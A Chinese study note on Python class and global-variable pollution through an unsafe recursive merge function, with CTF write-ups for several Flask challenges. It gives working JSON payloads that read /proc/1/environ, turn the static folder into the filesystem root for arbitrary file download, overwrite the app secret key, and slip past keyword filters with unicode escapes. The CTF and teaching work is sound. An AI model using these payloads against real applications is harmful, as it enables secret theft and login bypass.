---
title: python原型链污染
date: 2025-10-17 19:28:23
tags:
- python原型链污染
category:
- 学习笔记
---

# python原型链污染

## 原型链污染

- python中，对象的属性和方法可以通过原型链来继承和获取
- 每一个对象都有一个原型，定义了其可以访问的属性和方法，所以可以通过修改原型链中的属性来利用漏洞攻击
- 当对象访问属性或方法时，会先对自身进行查找，找不到就一次往上级查找
- 要求被污染的类能 被查到
- **是对类的属性值的污染**，只能污染类的属性，不能污染类的方法

---

### 污染条件

**merge合并函数，将源参数赋值到目标参数**，用merge函数来修改父类函数

原型链污染

```
def merge(src, dst):  #src为原字典，dst为目标字典
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):  #键值对字典形式
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k)) 
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict: 
            merge(v, getattr(dst, k))  #递归到最终的父类
        else:
            setattr(dst, k, v)

```

合并过程，对src中的值进行遍历，判断dst目标字典中是都有 `__getitem__` 属性，以此来判断是否为字典形式

存在  `__getitem__`属性

- dst中 k 存在，且值为字典，合并嵌套字典(merge对内部的字典再进行遍历，将对应的每个键值对都取出来)
- dst中 k 不存在，或值不是字典，将键值对 `(k, v)` 添加到 `dst` 中

如果dst不含 `__getitem__`，直接检测dst中是否存在 k 值，值是否为字典

- 是，merge函数进行遍历，k作为dst，v作为src 继续遍历

### `__getitem__`

当访问一个对象的某个键时，会调用该方法

**示例**

污染类对象属性son.b()

```
class father:
    secret = "hello"

class son_a(father):
    pass

class son_b(father):
    pass

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


instance = son_b()
payload = {
    "__class__": {
        "__base__": {
            "secret": "world"
        }
    }
}
print(son_a.secret)			#继承父类的hello
print(instance.secret)
merge(payload, instance)
print(son_a.secret)
print(instance.secret)
```

输出为：

```
hello
hello
world
world
```

成功污染

---

### 污染原理：

```
def merge(src, dst):
    # 遍历源字典的所有键值对
    for k, v in src.items():
        
        # 检查目标对象是否支持字典式的访问 (有__getitem__方法)
        if hasattr(dst, '__getitem__'):
            # 如果目标对象中存在该键，且当前值是字典类型 -> 递归合并
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            # 否则直接设置键值对
            else:
                dst[k] = v
                
        # 如果目标对象有该属性，且当前值是字典类型 -> 递归合并
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
            
        # 其他情况：直接设置属性
        else:
            setattr(dst, k, v)
```

- **merge递归执行过程：**

  **第一次调用：** `merge(payload, instance)`

  - `k = "__class__", v = {"__base__": {...}}`
  - `instance`没有`__getitem__`方法 → 进入第二个条件
  - `hasattr(instance, "__class__")`为True，且`v`是字典 → 递归

  **第二次调用：** `merge({"__base__": {...}}, instance.__class__)`

  - `instance.__class__`就是`son_b`类
  - `k = "__base__", v = {"secret": "world"}`
  - `son_b`没有`__getitem__` → 进入第二个条件
  - `hasattr(son_b, "__base__")`为True
  - ，且`v`是字典 → 递归

  **第三次调用：** `merge({"secret": "world"}, son_b.__base__)`

  - `son_b.__base__`就是`father`类
  - `k = "secret", v = "world"`
  - `father`没有`__getitem__` → 进入第二个条件
  - `hasattr(father, "secret")`为True，但`v`不是字典 → 进入else
  - `setattr(father, "secret", "world")` ← **关键操作！**

---

### `__base__`继承关系获取目标类

如果我们想要污染的目标类 和 作为切入点的类，两者没有父子继承关系，就无法使用 `__base__`

---

### 获取全局变量

**`__init__`，`__globals__`**

`__class__`方法用来查看变量所属的类，根据前面的变量形式可以得到其所属的类。 （题中可以不加）

`__init__`：初始化方法；类的内置方法，是一种特殊的方法，被称为类的构造函数或初始化方法（类似PHP中的__construct(），当创建了这个类的实例时就会调用该方法。

**`__globals__`属性返回字典**，包含该函数所在模块的全局变量

`__file__`全局变量，返回当前文件路径（目录）

示例：

```
#globals辨析
secret_var = 114

def test():
    pass

class a:
    def __init__(self):
        pass

print(test.__globals__ == globals() == a.__init__.__globals__) # 比较 test 函数的全局变量字典、全局变量字典和 a 类的构造函数的全局变量字典
#True
```

返回True，代表`demo.__globals__`、`globals()` 以及 `A.__init__.__globals__` 三者相等

- `demo.__globals__` demo函数的全局命名空间，因为demo是在全局命名空间时定义的，所以 `demo.__globals__ ` 等于 全局命名空间 `globals()`
- `A.__init__.__globals__`是类`A.__init__`的全局命名空间 = `globals()`

**注意：**

**类没有 `__globals__` 属性**

**只有函数、方法、模块等特定对象才有 `__globals__` 属性**

**类的实例也能通过方法访问全局变量：**

```
#原型链污染.py

c = 2
class A:
    b = 1
    def __init__(self):
        pass

    def regular_method(self):
        return self.x

    def caonima(self):
        pass


a = A()
print(a.__init__.__globals__ == A.__init__.__globals__ == A.caonima.__globals__)

#true
```

---

```
a = 1


def demo():
    pass


class A:
    def __init__(self):
        pass


print(demo.__globals__)
print(globals())
print(A.__init__.__globals__)

#

{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x0000026FF4AFB850>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': 'E:\\Python_study\\CTF\\pythonu原型链污染\\demo2.py', '__cached__': None, 'a': 1, 'demo': <function demo at 0x0000026FF4B43920>, 'A': <class '__main__.A'>}
```

---

### **常见的linux系统下环境变量的路径：**

```
/proc/1/environ （常见的flag位置）
/proc/self/environ
/etc/profile
/etc/profile.d/*.sh
~/.bash_profile
~/.bashrc
/etc/bashrc
/proc/self/mem
/proc/self/maps
```

---

### 污染全局变量

示例：

```
#demo.py
a = 1

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


def demo():
    pass


class A:
    def __init__(self):
        pass


class B:
    classa = 2


instance = A()
payload = {
    "__init__": {
        "__globals__": {
            "a": 4,
            "B": {
                "classa": 5
            }
        }
    }
}
print(B.classa)
print(a)
merge(payload, instance)
print(B.classa)
print(a)

#
2
1
5
4
```

通过类A成功污染到全局变量a以及B类中的变量classa

### 获取其他模块

以上实例是基于，操作对象或者类是在入口文件当中，如果目标对象不在入口文件中，需对其他啊记载过的模块进行获取

#### import模块加载获取

通过payload模块重新定位加载

```
# attacker.py
import demo
from merge_function import merge  # 假设有之前的 merge 函数

class Weapon:
    def __init__(self):
        pass

# 攻击载荷：修改导入的 demo 模块
payload = {
    "__init__": {
        "__globals__": {
            "demo": {
                "a": 999,  # 修改模块级变量
                "B": {
                    "classa": 888,  # 修改类的属性
                    "new_attr": "被注入的属性"  # 添加新属性
                }
            }
        }
    }
}

print("攻击前:")
print(f"demo.a = {demo.a}")
print(f"demo.B.classa = {demo.B.classa}")

# 执行攻击
weapon = Weapon()
merge(payload, weapon)

print("\n攻击后:")
print(f"demo.a = {demo.a}")           # 输出: 999
print(f"demo.B.classa = {demo.B.classa}")  # 输出: 888
print(f"demo.B.new_attr = {getattr(demo.B, 'new_attr', '不存在')}")  # 输出: 被注入的属性
```

#### sys模块加载获取

引用sys模块下的module属性，这个属性能够加载出来在自运行开始所有已加载的模块，从而我们能够从属性中获取到我们想要污染的目标模块

同样用其加载demo.py

```
import sys
import demo

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)



payload = {
    "__init__": {
        "__globals__": {
            "sys":{
                "modules":{
                    "demo":{
                        "a":4,
                        "B":{
                            "classa":5
                        }
                    }
                }
            }
        }
    }
}


# 创建一个实例作为攻击载体
class AttackVector:
    def __init__(self):
        pass

# 执行攻击
print("攻击前:")
print(f"demo.a = {demo.a}")
print(f"demo.B.classa = {demo.B.classa}")

attack_vector = AttackVector()
merge(payload, attack_vector)  # 这里需要传入两个参数

print("\n攻击后:")
print(f"demo.a = {demo.a}")           # 输出: 4
print(f"demo.B.classa = {demo.B.classa}")  # 输出: 5
```

#### 加载器loader获取

**通过 `loader.__init__.__globals__['sys']`来获取sys模块**

（loader加载器的作用是实现模块加载，在内置模块importlib中具体实现，而`importlib`模块下所有的`py`文件中均引入了`sys`模块）

```
import math
# 获取模块的loader
loader = math.__loader__
#打印loader信息
print(loader)
```

math模块的`__loader__`属性包含了一个loader对象，负责加载math模块

示例：

```
import importlib
import demo

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

print("=== 通过 importlib 获取 sys ===")
print("攻击前:")
print(f"demo.a = {demo.a}")
print(f"demo.B.classa = {demo.B.classa}")

# 方法1：使用 importlib 模块
sys_module = importlib.__loader__.__init__.__globals__['sys']
print("✅ 通过 importlib.__loader__ 获取 sys 成功")

payload = {
    "__init__": {
        "__globals__": {
            "sys": {
                "modules": {
                    "demo": {
                        "a": 100,
                        "B": {
                            "classa": 200
                        }
                    }
                }
            }
        }
    }
}

class AttackVector:
    def __init__(self):
        pass

attack_vector = AttackVector()
attack_vector.__init__.__globals__['sys'] = sys_module
merge(payload, attack_vector)

print("\n攻击后:")
print(f"demo.a = {demo.a}")
print(f"demo.B.classa = {demo.B.classa}")
```

---



**通过`__spec__`获取sys模块**

在python中还存在一个`__spec__`，包含了关于类加载时候的信息，他定义在`Lib/importlib/_bootstrap.py`的类`ModuleSpec`，所以可以直接采用`<模块名>.__spec__.__init__.__globals__['sys']`获取到`sys`模块

```
import math

# 通过 __spec__ 访问 sys 模块
sys_module = math.__spec__.__init__.__globals__['sys']
print(f"sys 模块: {sys_module}")
print(f"sys.modules: {sys_module.modules}")

# 验证确实是同一个 sys 模块
import sys
print(f"是同一个对象: {sys_module is sys}")  # True
```

示例：

```
import demo
import math

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# 获取 sys 模块
sys_module = math.__spec__.__init__.__globals__['sys']

# 直接修改 demo 模块的 payload
payload = {
    "a": 4,
    "B": {
        "classa": 5
    }
}

print("攻击前:")
print(f"demo.a = {demo.a}")
print(f"demo.B.classa = {demo.B.classa}")

# 直接对 demo 模块执行 merge
merge(payload, sys_module.modules['demo'])

print("\n攻击后:")
print(f"demo.a = {demo.a}")           # 输出: 4
print(f"demo.B.classa = {demo.B.classa}")  # 输出: 5
```

---

#### 函数形参默认值替换

`__defaults__`元组，储存函数或方法的默认参数值，定义函数时，可为其参数指定默认值

```
def test_func(x, y=10, z=20):
    return x + y + z

print("修改前:")
print(f"默认值: {test_func.__defaults__}")  # (10, 20)
print(f"test_func(1): {test_func(1)}")     # 31

# 修改默认值
test_func.__defaults__ = (100, 200)

print("\n修改后:")
print(f"默认值: {test_func.__defaults__}")  # (100, 200)
print(f"test_func(1): {test_func(1)}")     # 301
```

---

## waf绕过以及解题技巧（例题）

### [DASCTF 2023 & 0X401七月暑期挑战赛]EzFlask（污染`__file__`全局变量、污染利用_static_folder 全局变量）

源码：

```
import uuid

from flask import Flask, request, session
# 导入黑名单列表
from secret import black_list
import json

app = Flask(__name__)
# 为 Flask 应用设置一个随机的 secret_key
app.secret_key = str(uuid.uuid4())

# 检查字符串中是否包含黑名单中的敏感字符
def check(data):
    for i in black_list:
        if i in data:
            return False
    return True

# 合并两个字典或对象
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

# 定义 user 类，用于存储用户信息
class user():
    def __init__(self):
        self.username = ""
        self.password = ""
        pass

    # 验证用户信息是否匹配
    def check(self, data):
        if self.username == data['username'] and self.password == data['password']:
            return True
        return False

# 存储用户对象的列表
Users = []

# 注册用户的路由处理函数
@app.route('/register',methods=['POST'])
def register():
    if request.data:
        try:
            # 检查请求数据是否合法
            if not check(request.data):
                return "Register Failed"
            # 将请求数据解析为 JSON 对象，所以我们发包要用json格式
            data = json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "Register Failed"
            User = user()   # 创建 user 对象
            merge(data, User)   # 合并数据到 user 对象
            Users.append(User)   # 将 user 对象添加到用户列表中
        except Exception:
            return "Register Failed"
        return "Register Success"
    else:
        return "Register Failed"

# 登录的路由处理函数
@app.route('/login',methods=['POST'])
def login():
    if request.data:
        try:
            data = json.loads(request.data)   # 将请求数据解析为 JSON 对象
            if "username" not in data or "password" not in data:
                return "Login Failed"
            for user in Users:
                if user.check(data):   # 验证用户信息是否匹配
                    session["username"] = data["username"]   # 将用户名存储在会话中
                    return "Login Success"
        except Exception:
            return "Login Failed"
    return "Login Failed"

# 主页的路由处理函数，用于返回当前文件的源代码
@app.route('/',methods=['GET'])
def index():
    #__file__：全局变量，返回当前目录
    return open(__file__, "r").read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5010)   # 在指定的主机和端口上运行 Flask 应用
```

一眼merge函数考虑打原型链污染

查看调用

在最后发现直接回显全局变量`__file__`

```
@app.route('/',methods=['GET'])
def index():
    return open(__file__, "r").read()
```

#### 解法一：污染file的值

那么可以考虑直接污染__file__的值

放在proc目录（3,4）下的环境变量配置文件，只会对当前用户起作用；在/etc下的环境变量所有的用户都起作用；

payload:

```
{
    "username":"aaa",
    "password":"bbb",
    "__class__":{
        "check":{
            "__globals__":{
                "__file__" : "/proc/1/environ"
            }
        }
    }
}

{
    "username": "aaa",
    "password": "bbb",
    "__init__": {
        "__globals__": {
            "__file__": "/proc/1/environ"
        }
    }
}
```

---

#### 解法二 污染_static_folder 全局变量

在 Python 中，全局变量 app 和 _static_folder 通常用于构建 Web 应用程序，并且这两者在 Flask 框架中经常使用。

1、app 全局变量： 

-  app 是 Flask 应用的实例，是一个 Flask 对象。通过创建 app 对象，我们可以定义路由、处理请求、设置配置等，从而构建一个完整的 Web 应用程序。

-  Flask 应用实例是整个应用的核心，负责处理用户的请求并返回相应的响应。可以通过 app.route 装饰器定义路由，将不同的 URL 请求映射到对应的处理函数上。

-  app 对象包含了大量的功能和方法，例如 route、run、add_url_rule 等，这些方法用于处理请求和设置应用的各种配置。 

-  通过 app.run() 方法，我们可以在指定的主机和端口上启动 Flask 应用，使其监听并处理客户端的请求。 

---

2、static_folder 全局变量： 

-  _static_folder 是 Flask 应用中用于指定静态文件的文件夹路径。静态文件通常包括 CSS、JavaScript、图像等，用于展示网页的样式和交互效果。

- 静态文件可以包含在 Flask 应用中，例如 CSS 文件用于设置网页样式，JavaScript 文件用于实现网页的交互功能，图像文件用于显示图形内容等。

-  在 Flask 中，可以通过 app.static_folder 属性来访问 _static_folder，并指定存放静态文件的文件夹路径。默认情况下，静态文件存放在应用程序的根目录下的 static 文件夹中。 

- Flask 在处理请求时，会自动寻找静态文件的路径，并将静态文件发送给客户端，使网页能够正确地显示样式和图像。

综上所述，app 和 _static_folder 这两个全局变量在 Flask 应用中都扮演着重要的角色，app 是整个应用的核心实例，用于处理请求和设置应用的配置，而 _static_folder 是用于指定静态文件的存放路径，使网页能够正确地加载和显示样式和图像。

/static/proc/1/environ：由于"_static_folder":"/"把静态目录直接设置为了根目录，所以根目录下/proc/1/environ可以通过访问静态目录/static/proc/1/environ访问。

_static_folder默认为/static

**payload：**

```
{
    "username":aaa,
    "password":bbb,
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"/"
            }
        }
    }
}
```

---

### ctfshow easy_polluted（unicode绕过关键字waf）

源码：

```
from flask import Flask, session, redirect, url_for,request,render_template
import os
import hashlib
import json
import re
def generate_random_md5():
    random_string = os.urandom(16)
    md5_hash = hashlib.md5(random_string)

    return md5_hash.hexdigest()
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)


app = Flask(__name__)
app.secret_key = generate_random_md5()

class evil():
    def __init__(self):
        pass

@app.route('/',methods=['POST'])
def index():
    username = request.form.get('username')
    password = request.form.get('password')
    session["username"] = username
    session["password"] = password
    Evil = evil()
    if request.data:
        if filter(str(request.data)):
            return "NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~"
        else:
            merge(json.loads(request.data), Evil)
            return "MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED"
    return render_template("index.html")

@app.route('/admin',methods=['POST', 'GET'])
def templates():
    username = session.get("username", None)
    password = session.get("password", None)
    if username and password:
        if username == "adminer" and password == app.secret_key:
            return render_template("flag.html", flag=open("/flag", "rt").read())
        else:
            return "Unauthorized"
    else:
        return f'Hello,  This is the POLLUTED page.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

需将app.secret_key污染成我们想要的值即可

 merge函数（原型链污染经典函数）

payload：

```
{
  "username": "adminer",
  "password": "123",
  "__init__": {
    "__globals__": {
      "app": {
        "secret_key": "123",
        "_static_folder": "/"
      }
    }
  }
}
```

但是这里存在waf

```
def filter(user_input):
    blacklisted_patterns = ['init', 'global', 'env', 'app', '_', 'string']
    for pattern in blacklisted_patterns:
        if re.search(pattern, user_input, re.IGNORECASE):
            return True
    return False
```

**可以使用unicode编码绕过(json.loads可以加载unicode)**

```
{"username":"adminer","password":"123","\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f" : {"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f" :{"\u0061\u0070\u0070" :{"\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079": "123","\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072":"\u002f"}}}}
```

**注意：unicode和字母混合也可以解析并污染成功**

---

### [GHCTF 2024 新生赛]Po11uti0n~~~（污染`__file__`全局变量+unicode绕过、_static_folder全局变量污染）

源码：

```
import uuid
from flask import Flask, request, session
from secret import black_list
import json


'''
  @Author: hey
  @message: Patience is the key in life,I think you'll be able to find vulnerabilities in code audits.
  * Th3_w0r1d_of_c0d3_1s_be@ut1ful_ but_y0u_c@n’t_c0mp1l3_love.
'''

app = Flask(__name__)
app.secret_key = str(uuid.uuid4())

def cannot_be_bypassed(data):
    for i in black_list:
        if i in data:
            return False
    return True

def magicallllll(src, dst):
    if hasattr(dst, '__getitem__'):
        for key in src:
            if isinstance(src[key], dict):
                 if key in dst and isinstance(src[key], dict):
                    magicallllll(src[key], dst[key])
                 else:
                     dst[key] = src[key]
            else:
                dst[key] = src[key]
    else:
        for key, value in src.items() :
            if hasattr(dst,key) and isinstance(value, dict):
                magicallllll(value,getattr(dst, key))
            else:
                setattr(dst, key, value)

class user():
    def __init__(self):
        self.username = ""
        self.password = ""
        pass
    def check(self, data):
        if self.username == data['username'] and self.password == data['password']:
            return True
        return False

Users = []

@app.route('/user/register',methods=['POST'])
def register():
    if request.data:
        try:
            if not cannot_be_bypassed(request.data):
                return "Hey bro,May be you should check your inputs,because it contains malicious data,Please don't hack me~~~ :) :) :)"
            data = json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "Ohhhhhhh,The username or password is incorrect,Please re-register!!!"
            User = user()
            magicallllll(data, User)
            Users.append(User)
        except Exception:
            return "Ohhhhhhh,The username or password is incorrect,Please re-register!!!"
        return "Congratulations,The username and password is correct,Register Success!!!"
    else:
        return "Ohhhhhhh,The username or password is incorrect,Please re-register!!!"

@app.route('/user/login',methods=['POST'])
def login():
    if request.data:
        try:
            data = json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "The username or password is incorrect,Login Failed,Please log in again!!!"
            for user in Users:
                if user.cannot_be_bypassed(data):
                    session["username"] = data["username"]
                    return "Congratulations,The username and password is correct,Login Success!!!"
        except Exception:
            return "The username or password is incorrect,Login Failed,Please log in again!!!"
    return "Hey bro,May be you should check your inputs,because it contains malicious data,Please don't hack me~~~ :) :) :)"

@app.route('/',methods=['GET'])
def index():
    return open(__file__, "r").read()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
```

#### 解法一 (污染`__file__`)

审计代码发现漏洞代码

```
return open(__file__, "r").read()
```

payload：原型链污染修改`__file__`路径为环境变量

```
{"username":"abc","password":"123","__class__":{"check":{"__globals__":{"__file__":"/proc/1/environ"}}}}
```

unicode编码绕过waf

```
{"username":"abc","password":"123","\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f":{"\u0063\u0068\u0065\u0063\u006b":{"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f":{"\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f":"\u002f\u0070\u0072\u006f\u0063\u002f\u0031\u002f\u0065\u006e\u0076\u0069\u0072\u006f\u006e"}}}}
```

---

#### 解法二（污染`_static_folder`）

修改`_static_folder`为根目录，实现任意文件下载

```
{"username":"ten","password":"123456","__init__":{"__globals__":{"app":{"_static_folder":"/"}}}}
```

unicode编码绕过

```
{"username":"ten","password":"123456","\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f":{"\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f":{"\u0061\u0070\u0070":{"\u005f\u0073\u0074\u0061\u0074\u0069\u0063\u005f\u0066\u006f\u006c\u0064\u0065\u0072":"/"}}}}
```

访问/static/xxx就可以任意文件下载





















